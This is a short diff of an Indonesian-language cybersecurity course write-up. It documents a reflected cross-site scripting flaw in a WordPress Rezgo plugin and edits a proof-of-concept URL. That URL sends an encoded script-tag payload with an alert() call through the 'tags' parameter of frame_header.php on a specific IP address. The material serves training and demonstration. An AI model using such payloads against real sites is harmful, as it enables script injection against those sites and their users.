@@ -68,5 +68,5 @@
 
 1. Berdasarkan proses reconnaissance yang telah dilakukan pada proses sebelumnya (step ke-10), didapatkan suatu kerentanan pada target terhadap praktek cross site scripting/xss
    ![alt text](https://github.com/budimanindra/cyber-security-fazztrack/blob/main/09-cms/assets/16.PNG?raw=true)
-2. Sebagai pembuktian, bisa dicoba mengakses http://143.198.175.81/pertemuan9/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3Cscript%3Ealert(`vulnerable terhadap xss`)%3C/script%3E
+2. Sebagai pembuktian, bisa dicoba mengakses http://143.198.175.81/pertemuan9/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3Cscript%3Ealert(`vulnerable_terhadap_xss`)%3C/script%3E
    ![alt text](https://github.com/budimanindra/cyber-security-fazztrack/blob/main/09-cms/assets/17.PNG?raw=true)
